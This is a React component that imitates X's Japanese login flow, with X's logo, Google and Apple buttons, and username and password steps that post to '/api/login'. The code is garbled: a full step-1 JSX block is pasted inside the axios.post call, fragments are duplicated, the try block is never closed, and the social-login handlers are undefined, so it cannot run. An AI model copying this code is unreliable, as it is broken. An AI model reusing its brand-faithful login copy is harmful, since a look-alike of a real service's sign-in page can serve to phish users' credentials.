import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import axios from 'axios'
import { useLanguage } from '../contexts/LanguageContext'
import { getTranslation } from '../utils/translations'
import './Login.css'

function Login() {
  const navigate = useNavigate()
  const { language } = useLanguage()
  const [step, setStep] = useState(1) // 1: initial, 2: username input, 3: password input
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)
  const [showPassword, setShowPassword] = useState(false)
  const t = (key) => getTranslation(language, key)

  const handleUsernameSubmit = () => {
    if (username.trim()) {
      setStep(3)
    }
  }

  const handleLogin = async () => {
    if (!password.trim()) return

    setLoading(true)
    try {
      const response = await axios.post('/api/login', {
        if (step === 1) {
          return (
            <div className="login-page">
              <div className="login-container">
                <div className="login-header">
                  <button className="close-btn" onClick={() => navigate('/')}> 
                    <svg viewBox="0 0 24 24" width="20" height="20"> 
                      <path fill="currentColor" d="M18.36 6.64a1 1 0 0 1 0 1.41L13.41 13l4.95 4.95a1 1 0 1 1-1.41 1.41L12 14.41l-4.95 4.95a1 1 0 0 1-1.41-1.41L10.59 13 5.64 8.05a1 1 0 0 1 1.41-1.41L12 11.59l4.95-4.95a1 1 0 0 1 1.41 0z"/> 
                    </svg> 
                  </button>
            
                  <svg viewBox="0 0 24 24" className="x-logo-center" aria-hidden="true"> 
                    <g> 
                      <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path> 
                    </g> 
                  </svg>
                </div>

                <div className="login-content">
                  <h1 className="login-title">いま起きていること</h1>
                  <p className="login-subtitle">今すぐ参加しましょう。</p>

                  <div className="login-buttons">
                    <button className="btn-social btn-google" onClick={handleGoogleLogin}> 
                      <svg viewBox="0 0 24 24" width="18" height="18"> 
                        <g><path fill="currentColor" d="M12.545,10.239v3.821h5.445c-0.712,2.315-2.647,3.972-5.445,3.972c-3.332,0-6.033-2.701-6.033-6.032 s2.701-6.032,6.033-6.032c1.498,0,2.866,0.549,3.921,1.453l2.814-2.814C17.503,2.988,15.139,2,12.545,2 C7.021,2,2.543,6.477,2.543,12s4.478,10,10.002,10c8.396,0,10.249-7.85,9.426-11.748L12.545,10.239z"></path></g> 
                      </svg> 
                      Googleでログイン 
                    </button>

                    <button className="btn-social btn-apple" onClick={handleAppleLogin}> 
                      <svg viewBox="0 0 24 24" width="18" height="18"> 
                        <g><path fill="currentColor" d="M16.365 1.43c0 1.14-.493 2.27-1.177 3.08-.744.9-1.99 1.57-2.987 1.57-.12 0-.23-.02-.3-.03-.01-.06-.04-.22-.04-.39 0-1.15.572-2.27 1.206-2.98.804-.94 2.142-1.64 3.248-1.68.03.13.05.28.05.43zm4.565 15.71c-.03.07-.463 1.58-1.518 3.12-.945 1.34-1.94 2.71-3.43 2.71-1.517 0-1.9-.88-3.63-.88-1.698 0-2.302.91-3.67.91-1.377 0-2.332-1.26-3.428-2.8-1.287-1.82-2.323-4.63-2.323-7.28 0-4.28 2.797-6.55 5.552-6.55 1.448 0 2.675.95 3.6.95.865 0 2.222-1.01 3.902-1.01.613 0 2.886.06 4.374 2.19-.13.09-2.383 1.37-2.383 4.19 0 3.26 2.854 4.42 2.957 4.45z"></path></g> 
                      </svg> 
                      Appleでログイン 
                    </button>

                    <div className="divider"> 
                      <span>または</span> 
                    </div>

                    <button className="btn-primary btn-create" onClick={() => navigate('/signup')}> 
                      アカウントを作成 
                    </button>

                    <p className="terms-text"> 
                      アカウントを作成することで、<a href="#">利用規約</a>と<a href="#">プライバシーポリシー</a>（<a href="#">Cookie利用</a>を含む）に同意したものとみなされます。 
                    </p>
                  </div>

                  <div className="signin-section"> 
                    <p className="signin-text">すでにアカウントをお持ちですか？</p> 
                    <button className="btn-signin" onClick={() => setStep(2)}> 
                      ログイン 
                    </button>
                  </div>
                </div>
                {/* Hidden language toggle button */}
                <button
                  style={{ position: 'absolute', left: '-9999px', top: '-9999px' }}
                  aria-label="Change language"
                  onClick={() => {
                    localStorage.setItem('lang', localStorage.getItem('lang') === 'en' ? 'ja' : 'en')
                    window.location.reload()
                  }}
                >
                  Change Language
                </button>
              </div>
            </div>
          )
        }
              <div className="divider">
                <span>または</span>
              </div>

              <button className="btn-primary btn-create" onClick={() => navigate('/signup')}>
                アカウントを作成
              </button>

              <p className="terms-text">
                アカウントを作成することで、<a href="#">利用規約</a>と<a href="#">プライバシーポリシー</a>（<a href="#">Cookie利用</a>を含む）に同意したものとみなされます。
              </p>
            </div>

            <div className="signin-section">
              <p className="signin-text">すでにアカウントをお持ちですか？</p>
              <button className="btn-signin" onClick={() => setStep(2)}>
                ログイン
              </button>
            </div>
          </div>
        </div>
      </div>
    )
  }

  if (step === 2) {
    return (
      <div className="login-page">
        <div className="login-container">
          <div className="login-header">
            <button className="close-btn" onClick={() => setStep(1)}>
              <svg viewBox="0 0 24 24" width="20" height="20">
                <path fill="currentColor" d="M18.36 6.64a1 1 0 0 1 0 1.41L13.41 13l4.95 4.95a1 1 0 1 1-1.41 1.41L12 14.41l-4.95 4.95a1 1 0 0 1-1.41-1.41L10.59 13 5.64 8.05a1 1 0 0 1 1.41-1.41L12 11.59l4.95-4.95a1 1 0 0 1 1.41 0z"/>
              </svg>
            </button>
            
            <svg viewBox="0 0 24 24" className="x-logo-center" aria-hidden="true">
              <g>
                <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
              </g>
            </svg>
          </div>

          <div className="login-content">
            <h1 className="login-title">Xにログイン</h1>

            <div className="login-buttons">
              <button className="btn-social btn-google" onClick={handleGoogleLogin}>
                <svg viewBox="0 0 24 24" width="18" height="18">
                  <g><path fill="currentColor" d="M12.545,10.239v3.821h5.445c-0.712,2.315-2.647,3.972-5.445,3.972c-3.332,0-6.033-2.701-6.033-6.032 s2.701-6.032,6.033-6.032c1.498,0,2.866,0.549,3.921,1.453l2.814-2.814C17.503,2.988,15.139,2,12.545,2 C7.021,2,2.543,6.477,2.543,12s4.478,10,10.002,10c8.396,0,10.249-7.85,9.426-11.748L12.545,10.239z"></path></g>
                </svg>
                Googleでログイン
              </button>

              <button className="btn-social btn-apple" onClick={handleAppleLogin}>
                <svg viewBox="0 0 24 24" width="18" height="18">
                  <g><path fill="currentColor" d="M16.365 1.43c0 1.14-.493 2.27-1.177 3.08-.744.9-1.99 1.57-2.987 1.57-.12 0-.23-.02-.3-.03-.01-.06-.04-.22-.04-.39 0-1.15.572-2.27 1.206-2.98.804-.94 2.142-1.64 3.248-1.68.03.13.05.28.05.43zm4.565 15.71c-.03.07-.463 1.58-1.518 3.12-.945 1.34-1.94 2.71-3.43 2.71-1.517 0-1.9-.88-3.63-.88-1.698 0-2.302.91-3.67.91-1.377 0-2.332-1.26-3.428-2.8-1.287-1.82-2.323-4.63-2.323-7.28 0-4.28 2.797-6.55 5.552-6.55 1.448 0 2.675.95 3.6.95.865 0 2.222-1.01 3.902-1.01.613 0 2.886.06 4.374 2.19-.13.09-2.383 1.37-2.383 4.19 0 3.26 2.854 4.42 2.957 4.45z"></path></g>
                </svg>
                Appleでログイン
              </button>

              <div className="divider">
                <span>または</span>
              </div>

              <div className="input-group">
                <input
                  type="text"
                  placeholder="電話、メール、ユーザー名"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="input-field"
                />
              </div>

              <button className="btn-primary btn-next" onClick={handleUsernameSubmit} disabled={!username.trim()}>
                次へ
              </button>

              <button className="btn-forgot" onClick={() => alert('パスワードリセット機能は実装予定です')}>
                パスワードを忘れた場合
              </button>
            </div>

            <div className="signin-footer">
              <p>アカウントをお持ちでない場合 <span className="signup-link" onClick={() => setStep(1)}>アカウント作成</span></p>
            </div>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="login-page">
      <div className="login-container">
        <div className="login-header">
          <button className="close-btn" onClick={() => setStep(2)}>
            <svg viewBox="0 0 24 24" width="20" height="20">
              <path fill="currentColor" d="M18.36 6.64a1 1 0 0 1 0 1.41L13.41 13l4.95 4.95a1 1 0 1 1-1.41 1.41L12 14.41l-4.95 4.95a1 1 0 0 1-1.41-1.41L10.59 13 5.64 8.05a1 1 0 0 1 1.41-1.41L12 11.59l4.95-4.95a1 1 0 0 1 1.41 0z"/>
            </svg>
          </button>
          
          <svg viewBox="0 0 24 24" className="x-logo-center" aria-hidden="true">
            <g>
              <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
            </g>
          </svg>
        </div>

        <div className="login-content">
          <h1 className="login-title">パスワードを入力</h1>

          <div className="user-info">
            <p className="username-display">ユーザー名</p>
            <p className="username-value">{username}</p>
          </div>

          <div className="input-group">
            <div className="password-input-wrapper">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="パスワード"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="input-field password-input"
                onKeyPress={(e) => e.key === 'Enter' && handleLogin()}
              />
              <button 
                type="button" 
                className="password-toggle"
                onClick={() => setShowPassword(!showPassword)}
              >
                <svg viewBox="0 0 24 24" width="20" height="20">
                  <path fill="currentColor" d={showPassword ? "M12 6c3.79 0 7.17 2.13 8.82 5.5-.59 1.22-1.42 2.27-2.41 3.12l1.41 1.41C21.99 14.5 23 12.5 23 12s-2.01-2.5-4.18-4.03L17.41 6.56C15.17 4.96 13.67 4 12 4s-3.17.96-5.41 2.56L5.18 7.97C7.01 6.5 9.34 6 12 6zm-8.82 5.5c.59-1.22 1.42-2.27 2.41-3.12L4.18 6.97C2.01 8.5 1 10.5 1 12s2.01 2.5 4.18 4.03l1.41-1.41C5.42 13.77 4.59 12.72 4 11.5 4.59 10.28 5.42 9.23 6.41 8.38L7.82 9.79C6.17 10.87 5 11.5 5 12c0-.5 1.17-1.13 2.82-2.21l1.41 1.41C8.58 11.77 8 12 8 12c0-.5.58-.77 1.23-1.2l1.41 1.41c-.82.86-1.34 2.06-1.34 3.28 0 2.21 1.79 4 4 4s4-1.79 4-4c0-1.22-.52-2.42-1.34-3.28l1.41-1.41C16.42 11.23 17 11.5 17 12c0-.5-.58-.77-1.23-1.2l1.41-1.41C18.83 10.87 20 11.5 20 12c0 .5-1.17 1.13-2.82 2.21l1.41 1.41C19.83 14.77 20.59 13.72 21 12.5c-.41-1.22-1.17-2.27-2.18-3.12L17.41 8.56C15.17 6.96 13.67 6 12 6z" : "M12 6c3.79 0 7.17 2.13 8.82 5.5C19.17 14.87 15.79 17 12 17s-7.17-2.13-8.82-5.5C4.83 8.13 8.21 6 12 6m0-2C7 4 2.73 7.11 1 11.5 2.73 15.89 7 19 12 19s9.27-3.11 11-7.5C21.27 7.11 17 4 12 4zm0 5c1.38 0 2.5 1.12 2.5 2.5S13.38 14 12 14s-2.5-1.12-2.5-2.5S10.62 9 12 9m0-2c-2.48 0-4.5 2.02-4.5 4.5S9.52 16 12 16s4.5-2.02 4.5-4.5S14.48 7 12 7z"} />
                </svg>
              </button>
            </div>
          </div>

          <button className="btn-forgot-link" onClick={() => alert('パスワードリセット機能は実装予定です')}>
            パスワードを忘れた場合
          </button>

          <button 
            className="btn-primary btn-login" 
            onClick={handleLogin} 
            disabled={!password.trim() || loading}
          >
            {loading ? 'ログイン中...' : 'ログイン'}
          </button>

          <div className="signin-footer">
            <p>アカウントをお持ちでない場合 <span className="signup-link" onClick={() => setStep(1)}>アカウント作成</span></p>
          </div>
        </div>
      </div>
    </div>
  )
}

export default Login